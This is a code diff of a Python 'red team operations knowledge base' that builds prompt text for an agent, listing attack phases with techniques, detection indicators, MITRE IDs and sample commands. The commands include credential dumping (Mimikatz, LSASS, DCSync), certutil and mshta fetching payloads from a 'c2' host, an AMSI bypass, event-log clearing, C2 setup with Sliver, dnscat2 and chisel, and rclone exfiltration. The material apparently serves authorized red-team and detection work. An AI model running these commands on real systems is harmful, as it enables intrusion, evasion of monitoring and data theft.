@@ -1,16 +1,17 @@
 """Red team operations knowledge base.
 
-Deep knowledge about red team operations:
-1. Red team methodology
-2. Initial access techniques
-3. Lateral movement
-4. Persistence mechanisms
-5. Command and control (C2)
+Attack patterns for red team engagements:
+1. Initial Access — phishing, watering hole, supply chain, exposed services
+2. Execution & Persistence — LOLBins, scheduled tasks, registry, WMI
+3. Defense Evasion — AMSI bypass, ETW patching, unhooking, process injection
+4. Command & Control — DNS tunneling, domain fronting, covert channels
+5. Objective Completion — data exfiltration, impact, ransomware simulation
 """
 
 from __future__ import annotations
 
 from dataclasses import dataclass, field
+from enum import Enum
 from typing import Any
 
 import structlog
@@ -18,291 +19,206 @@ import structlog
 logger = structlog.get_logger()
 
 
+class RedTeamPhase(str, Enum):
+    INITIAL_ACCESS = "initial_access"
+    EXECUTION_PERSIST = "execution_persist"
+    DEFENSE_EVASION = "defense_evasion"
+    COMMAND_CONTROL = "command_control"
+    OBJECTIVE = "objective"
+
+
 @dataclass
 class RedTeamPattern:
-    """A red team pattern."""
-    pattern_id: str = ""
     name: str = ""
-    category: str = ""
-    severity: str = "critical"
+    phase: RedTeamPhase = RedTeamPhase.INITIAL_ACCESS
     description: str = ""
-    detection_strategy: str = ""
+    techniques: list[str] = field(default_factory=list)
+    indicators: list[str] = field(default_factory=list)
     tools: list[str] = field(default_factory=list)
+    commands: list[str] = field(default_factory=list)
+    mitre_ids: list[str] = field(default_factory=list)
+    severity: str = "high"
 
     def to_dict(self) -> dict[str, Any]:
-        return {
-            "id": self.pattern_id,
-            "name": self.name[:25],
-            "category": self.category[:12],
-        }
+        return {"name": self.name, "phase": self.phase.value, "severity": self.severity, "techniques": len(self.techniques)}
 
 
-RT_PATTERNS: list[dict[str, Any]] = [
-    {
-        "id": "rt-001", "name": "Red Team Methodology",
-        "category": "methodology", "severity": "critical",
-        "desc": "Red team engagement methodology.",
-        "detection": (
-            "RED TEAM METHODOLOGY:\n"
-            "PHASES:\n"
-            "  1. Reconnaissance (passive + active)\n"
-            "  2. Initial Access (foothold)\n"
-            "  3. Execution (run malicious code)\n"
-            "  4. Persistence (survive reboots)\n"
-            "  5. Privilege Escalation (admin/root)\n"
-            "  6. Defense Evasion (avoid detection)\n"
-            "  7. Credential Access (passwords/tokens)\n"
-            "  8. Discovery (internal recon)\n"
-            "  9. Lateral Movement (pivot)\n"
-            "  10. Collection (gather data)\n"
-            "  11. Command & Control (maintain access)\n"
-            "  12. Exfiltration (extract data)\n"
-            "  13. Impact (if authorized)\n"
-            "FRAMEWORKS:\n"
-            "  - MITRE ATT&CK (technique mapping)\n"
-            "  - Cyber Kill Chain (Lockheed Martin)\n"
-            "  - PTES (Penetration Testing Execution Standard)\n"
-            "  - OSSTMM\n"
-            "RULES:\n"
-            "  - Stay within authorized scope\n"
-            "  - Document everything\n"
-            "  - Have emergency contacts\n"
-            "  - Permission letters (Get Out of Jail)\n"
-            "  - Deconfliction with blue team\n"
-            "  - Safe words / abort procedures"
-        ),
-        "tools": [],
-    },
-    {
-        "id": "rt-002", "name": "Initial Access Techniques",
-        "category": "initial_access", "severity": "critical",
-        "desc": "Initial access techniques.",
-        "detection": (
-            "INITIAL ACCESS:\n"
-            "EXTERNAL:\n"
-            "  - Phishing (credentials, payload)\n"
-            "  - Public-facing exploitation (CVEs)\n"
-            "  - Password spraying (O365, VPN)\n"
-            "  - Supply chain compromise\n"
-            "  - Trusted relationship abuse\n"
-            "  - VPN/RDP brute force\n"
-            "  - Cloud misconfig (S3, storage)\n"
-            "TECHNIQUES:\n"
-            "  PHISHING:\n"
-            "    - HTML smuggling\n"
-            "    - ISO/IMG containers (MotW bypass)\n"
-            "    - OneNote payloads\n"
-            "    - QR code phishing\n"
-            "    - Evilginx (session hijacking)\n"
-            "  PASSWORD SPRAYING:\n"
-            "    # O365\n"
-            "    trevorspray -u users.txt -p 'Winter2026!'\n"
-            "    # OWA\n"
-            "    ruler --domain target.com brute\n"
-            "  EXPLOITATION:\n"
-            "    # External services\n"
-            "    nuclei -t cves/ -u https://target.com\n"
-            "    # Known vulns: Exchange (ProxyLogon/Shell)\n"
-            "    # Citrix, VPN appliances, Confluence\n"
-            "OPSEC:\n"
-            "  - Rotate source IPs\n"
-            "  - Respect lockout thresholds\n"
-            "  - Use residential proxies\n"
-            "  - Domain fronting\n"
-            "TOOLS:\n"
-            "  GoPhish, Evilginx2, TrevorSpray, Ruler"
-        ),
-        "tools": ["gophish", "evilginx2"],
-    },
-    {
-        "id": "rt-003", "name": "Lateral Movement",
-        "category": "lateral", "severity": "critical",
-        "desc": "Lateral movement techniques.",
-        "detection": (
-            "LATERAL MOVEMENT:\n"
-            "WINDOWS:\n"
-            "  - PSExec / SMBExec\n"
-            "  - WMI (wmic, Invoke-WmiMethod)\n"
-            "  - WinRM (Enter-PSSession)\n"
-            "  - RDP (mstsc, SharpRDP)\n"
-            "  - DCOM (MMC20, ShellWindows)\n"
-            "  - Pass-the-Hash (PTH)\n"
-            "  - Pass-the-Ticket (PTT)\n"
-            "  - Overpass-the-Hash (PTK)\n"
-            "  - Token impersonation\n"
-            "LINUX:\n"
-            "  - SSH (keys, agent forwarding)\n"
-            "  - SSH tunneling / port forwarding\n"
-            "  - Ansible / Salt / Puppet abuse\n"
-            "  - NFS/SMB shares\n"
-            "CREDENTIAL:\n"
-            "  # Mimikatz\n"
-            "  mimikatz 'sekurlsa::logonpasswords'\n"
-            "  # LSASS dump\n"
-            "  procdump -ma lsass.exe lsass.dmp\n"
-            "  # SAM dump\n"
-            "  reg save HKLM\\SAM sam.hive\n"
-            "  # Kerberoasting\n"
-            "  GetUserSPNs.py domain/user:pass -dc-ip DC\n"
-            "  # AS-REP Roasting\n"
-            "  GetNPUsers.py domain/ -usersfile users.txt\n"
-            "AD:\n"
-            "  # BloodHound (path finding)\n"
-            "  bloodhound-python -d domain -u user -p pass\n"
-            "  # DCSync\n"
-            "  secretsdump.py domain/admin@DC\n"
-            "TOOLS:\n"
-            "  Impacket, Mimikatz, BloodHound, CrackMapExec"
-        ),
-        "tools": ["impacket", "bloodhound"],
-    },
-    {
-        "id": "rt-004", "name": "Persistence Mechanisms",
-        "category": "persistence", "severity": "high",
-        "desc": "Persistence techniques.",
-        "detection": (
-            "PERSISTENCE:\n"
-            "WINDOWS:\n"
-            "  - Registry Run keys\n"
-            "  - Scheduled Tasks (schtasks)\n"
-            "  - Services (sc.exe)\n"
-            "  - WMI event subscriptions\n"
-            "  - DLL hijacking / search order\n"
-            "  - COM object hijacking\n"
-            "  - Startup folder\n"
-            "  - Golden/Silver tickets (Kerberos)\n"
-            "  - DSRM password\n"
-            "  - Skeleton key\n"
-            "  - AdminSDHolder\n"
-            "  - SID History injection\n"
-            "LINUX:\n"
-            "  - Crontab\n"
-            "  - systemd service\n"
-            "  - SSH authorized_keys\n"
-            "  - .bashrc / .profile\n"
-            "  - LD_PRELOAD\n"
-            "  - PAM backdoor\n"
-            "  - Kernel module (rootkit)\n"
-            "  - Web shell\n"
-            "CLOUD:\n"
-            "  - IAM user/role creation\n"
-            "  - Lambda/Function backdoor\n"
-            "  - OAuth app registration\n"
-            "  - Service principal\n"
-            "  - API key creation\n"
-            "WEB:\n"
-            "  - Web shell upload\n"
-            "  - Stored XSS for credential harvest\n"
-            "  - Database backdoor (trigger/function)\n"
-            "TOOLS:\n"
-            "  SharPersist, PowerLurk, Merlin"
-        ),
-        "tools": [],
-    },
-    {
-        "id": "rt-005", "name": "Command and Control",
-        "category": "c2", "severity": "critical",
-        "desc": "C2 frameworks and techniques.",
-        "detection": (
-            "COMMAND AND CONTROL (C2):\n"
-            "FRAMEWORKS:\n"
-            "  COBALT STRIKE:\n"
-            "    - Industry standard (commercial)\n"
-            "    - Beacon payload\n"
-            "    - Malleable C2 profiles\n"
-            "    - Team server\n"
-            "  SLIVER:\n"
-            "    - Open source (BishopFox)\n"
-            "    - Multi-protocol (mTLS, HTTP, DNS, WG)\n"
-            "    - Implant generation\n"
-            "    - Multiplayer operation\n"
-            "  HAVOC:\n"
-            "    - Modern, open source\n"
-            "    - BOF (Beacon Object Files) support\n"
-            "    - Demon agent\n"
-            "    - Team collaboration\n"
-            "  MYTHIC:\n"
-            "    - Modular, web UI\n"
-            "    - Multi-agent support\n"
-            "    - Container-based\n"
-            "TECHNIQUES:\n"
-            "  - HTTPS (blend with web traffic)\n"
-            "  - DNS (slow but stealthy)\n"
-            "  - Domain fronting (CDN abuse)\n"
-            "  - Named pipes (SMB, internal)\n"
-            "  - Jitter (random sleep intervals)\n"
-            "  - Kill dates (auto-cleanup)\n"
-            "  - Encrypted channels\n"
-            "OPSEC:\n"
-            "  - Categorized domains\n"
-            "  - Aged domains\n"
-            "  - Redirectors (Apache, Nginx)\n"
-            "  - CDN/cloud functions as relays\n"
-            "  - Traffic profiles (mimic legitimate)\n"
-            "TOOLS:\n"
-            "  Cobalt Strike, Sliver, Havoc, Mythic, Merlin"
-        ),
-        "tools": ["sliver", "havoc"],
-    },
+RED_TEAM_PATTERNS: list[RedTeamPattern] = [
+    RedTeamPattern(
+        name="Initial Access Techniques",
+        phase=RedTeamPhase.INITIAL_ACCESS,
+        description="Gaining first foothold: spear-phishing with macro payloads, watering hole via compromised sites, exploiting exposed services (VPN, RDP, Citrix), supply chain compromise, and valid credential abuse.",
+        techniques=[
+            "Spear-phishing with Office macro payload (VBA stomping)",
+            "HTML smuggling to bypass email gateway",
+            "Watering hole attack on industry-specific sites",
+            "Exploit public-facing apps (CVE-based: VPN, Exchange, Citrix)",
+            "Valid credential abuse from password spraying or credential dumps",
+            "Supply chain compromise via trusted vendor access",
+            "USB drop attack with HID payloads (Rubber Ducky)",
+            "QR code phishing (quishing) to credential harvesting page",
+        ],
+        indicators=[
+            "Email with macro-enabled attachment from unknown sender",
+            "Outbound connection to newly registered domain",
+            "VPN/RDP brute force attempts in authentication logs",
+            "HTML file attachment with embedded JavaScript payload",
+        ],
+        tools=["gophish", "evilginx2", "modlishka", "social-engineer-toolkit"],
+        commands=[
+            "gophish --admin-url https://0.0.0.0:3333",
+            "evilginx2 -p phishlets/ -debug",
+            "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; run'",
+            "responder -I eth0 -wrf",
+            "crackmapexec smb target_range -u users.txt -p passwords.txt --continue-on-success",
+        ],
+        mitre_ids=["T1566", "T1190", "T1078", "T1195", "T1189"],
+        severity="critical",
+    ),
+    RedTeamPattern(
+        name="Execution & Persistence",
+        phase=RedTeamPhase.EXECUTION_PERSIST,
+        description="Executing payloads and establishing persistence: LOLBins (certutil, mshta, regsvr32), scheduled tasks, registry run keys, WMI event subscriptions, DLL side-loading, and COM object hijacking.",
+        techniques=[
+            "LOLBin execution: certutil -urlcache -split -f <url> payload.exe",
+            "MSHTA execution: mshta vbscript:Execute(code)",
+            "Scheduled task persistence: schtasks /create with SYSTEM",
+            "Registry run key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "WMI event subscription persistence (__EventFilter + __FilterToConsumerBinding)",
+            "DLL side-loading via legitimate signed binary",
+            "COM object hijacking for persistence",
+            "Startup folder shortcut with hidden payload",
+        ],
+        indicators=[
+            "certutil.exe downloading files from external URL",
+            "New scheduled task created with SYSTEM privileges",
+            "Registry run key modification for unknown binary",
+            "WMI EventFilter creation in __FilterToConsumerBinding",
+            "DLL loaded from unusual path by signed binary",
+        ],
+        tools=["impacket", "sliver", "covenant", "sharp-collection"],
+        commands=[
+            "schtasks /create /tn 'SystemUpdate' /tr 'C:\\payload.exe' /sc onlogon /ru SYSTEM",
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\payload.exe",
+            "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='BotFilter'",
+            "certutil -urlcache -split -f http://c2/payload.exe C:\\Windows\\Temp\\svc.exe",
+            "mshta http://c2/payload.hta",
+        ],
+        mitre_ids=["T1053", "T1547", "T1546", "T1218", "T1574"],
+        severity="high",
+    ),
+    RedTeamPattern(
+        name="Defense Evasion",
+        phase=RedTeamPhase.DEFENSE_EVASION,
+        description="Bypassing security controls: AMSI bypass, ETW patching, EDR unhooking via direct syscalls, process injection (process hollowing, early bird APC), timestomping, and indicator removal.",
+        techniques=[
+            "AMSI bypass: patching AmsiScanBuffer in memory",
+            "ETW patching: NtTraceEvent hook to blind EDR telemetry",
+            "Direct syscalls (SysWhispers) to bypass ntdll hooks",
+            "Process hollowing: create suspended process, map payload",
+            "Early Bird APC injection into newly created thread",
+            "PPID spoofing to appear as child of legitimate process",
+            "Timestomping: modify file timestamps to blend in",
+            "Event log tampering: clear Security/PowerShell logs",
+        ],
+        indicators=[
+            "AmsiScanBuffer memory region modified",
+            "Direct syscall instruction patterns (syscall/int 2e)",
+            "Process with mismatched parent PID",
+            "File with creation timestamp before OS install date",
+            "Security event log cleared (Event ID 1102)",
+        ],
+        tools=["sharpunhooker", "syscallswow64", "donut", "reflective-dll"],
+        commands=[
+            "powershell -ep bypass -c '[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)'",
+            "donut -i payload.exe -o loader.bin -a 2 -f 1",
+            "wevtutil cl Security",
+            "timestomp C:\\payload.exe -m '01/01/2020 12:00:00'",
+        ],
+        mitre_ids=["T1562", "T1055", "T1070", "T1036", "T1134"],
+        severity="critical",
+    ),
+    RedTeamPattern(
+        name="Command & Control",
+        phase=RedTeamPhase.COMMAND_CONTROL,
+        description="Establishing covert C2 channels: DNS tunneling, domain fronting via CDN, HTTPS beacons with jitter, named pipe pivoting, and covert channels over allowed protocols.",
+        techniques=[
+            "DNS tunneling: encode data in DNS TXT/CNAME queries",
+            "Domain fronting: use legitimate CDN (CloudFront, Azure) as proxy",
+            "HTTPS beacon with jitter and sleep variation",
+            "Named pipe pivoting for internal lateral C2",
+            "Slack/Teams/Discord bot as C2 channel",
+            "Websocket C2 over standard HTTPS port",
+            "ICMP tunneling for data exfiltration",
+            "Steganography: hide data in image/document metadata",
+        ],
+        indicators=[
+            "High volume of DNS TXT queries to single domain",
+            "HTTPS traffic to CDN with unusual SNI/Host mismatch",
+            "Regular beacon pattern with slight timing jitter",
+            "Named pipe connections between unrelated processes",
+            "Outbound traffic to Slack/Discord API from server process",
+        ],
+        tools=["sliver", "cobalt-strike", "mythic", "havoc", "dnscat2"],
+        commands=[
+            "sliver > generate --mtls c2.example.com --os windows --arch amd64",
+            "sliver > mtls --lhost 0.0.0.0 --lport 8888",
+            "dnscat2 --dns server=c2dns.example.com",
+            "chisel server -p 8080 --reverse",
+            "chisel client c2:8080 R:socks",
+        ],
+        mitre_ids=["T1071", "T1090", "T1572", "T1573", "T1102"],
+        severity="high",
+    ),
+    RedTeamPattern(
+        name="Objective Completion",
+        phase=RedTeamPhase.OBJECTIVE,
+        description="Achieving engagement objectives: data identification and staging, exfiltration via approved channels, ransomware simulation (encrypt/decrypt demo), and business impact demonstration.",
+        techniques=[
+            "Data discovery: find sensitive files (PII, financials, IP)",
+            "Data staging: compress and encrypt before exfiltration",
+            "Exfiltration over HTTPS to cloud storage (S3, Azure Blob)",
+            "Exfiltration over DNS (slow but stealthy)",
+            "Ransomware simulation: encrypt test files with recoverable key",
+            "Domain admin compromise demonstration",
+            "Business email compromise simulation",
+            "Proof of concept: demonstrate full kill chain",
+        ],
+        indicators=[
+            "Large archive files created in temp directories",
+            "Bulk file access to sensitive document shares",
+            "Outbound transfer to cloud storage endpoints",
+            "File extension changes indicating encryption",
+            "Domain admin credentials used from unusual source",
+        ],
+        tools=["rclone", "megacmd", "7zip", "impacket"],
+        commands=[
+            "find /share -name '*.xlsx' -o -name '*.docx' -o -name '*.pdf' | head -100",
+            "7z a -p'SimulationKey123' -mhe=on staged_data.7z /share/sensitive/",
+            "rclone copy staged_data.7z remote:exfil-bucket/",
+            "secretsdump.py domain/admin:password@dc01.target.local",
+            "crackmapexec smb dc01 -u admin -p pass --shares",
+        ],
+        mitre_ids=["T1005", "T1074", "T1041", "T1486", "T1048"],
+        severity="critical",
+    ),
 ]
 
 
-class RedTeamKB:
-    """Red team operations knowledge base.
-
-    Provides red team patterns injected into agent prompts.
-    """
-
-    def __init__(self) -> None:
-        self._patterns: dict[str, RedTeamPattern] = {}
-        self._log = logger.bind(component="red_team_kb")
-        self._load_patterns()
-
-    def _load_patterns(self) -> None:
-        """Load red team patterns."""
-        for data in RT_PATTERNS:
-            pattern = RedTeamPattern(
-                pattern_id=data["id"],
-                name=data["name"],
-                category=data.get("category", ""),
-                severity=data.get("severity", "critical"),
-                description=data.get("desc", ""),
-                detection_strategy=data.get("detection", ""),
-                tools=data.get("tools", []),
-            )
-            self._patterns[pattern.pattern_id] = pattern
-
-    def get_by_category(self, category: str) -> list[RedTeamPattern]:
-        """Get patterns by category."""
-        return [
-            p for p in self._patterns.values()
-            if p.category.lower() == category.lower()
-        ]
-
-    def build_redteam_prompt(
-        self,
-        categories: list[str] | None = None,
-        max_patterns: int = 4,
-    ) -> str:
-        """Build red team prompt."""
-        lines = ["## Red Team Operations\n"]
-        count = 0
-        for pattern in self._patterns.values():
-            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
-                continue
-            if count >= max_patterns:
-                break
-            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
-            lines.append(pattern.detection_strategy)
-            lines.append("")
-            count += 1
-        return "\n".join(lines)
-
-    def get_stats(self) -> dict[str, Any]:
-        cat_counts: dict[str, int] = {}
-        for p in self._patterns.values():
-            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
-        return {
-            "patterns": len(self._patterns),
-            "by_category": cat_counts,
-        }
+def build_red_team_prompt(focus_phase: RedTeamPhase | None = None, max_patterns: int = 5) -> str:
+    lines = ["## Red Team Operations Knowledge\n"]
+    patterns = RED_TEAM_PATTERNS
+    if focus_phase:
+        patterns = [p for p in patterns if p.phase == focus_phase]
+    for pattern in patterns[:max_patterns]:
+        lines.append(f"### {pattern.name} [{pattern.severity}]")
+        lines.append(pattern.description)
+        lines.append("\nTechniques:")
+        for tech in pattern.techniques[:4]:
+            lines.append(f"  - {tech}")
+        lines.append("\nMITRE: " + ", ".join(pattern.mitre_ids[:5]))
+        lines.append("\nCommands:")
+        for cmd in pattern.commands[:3]:
+            lines.append(f"  $ {cmd}")
+        lines.append("")
+    return "\n".join(lines)
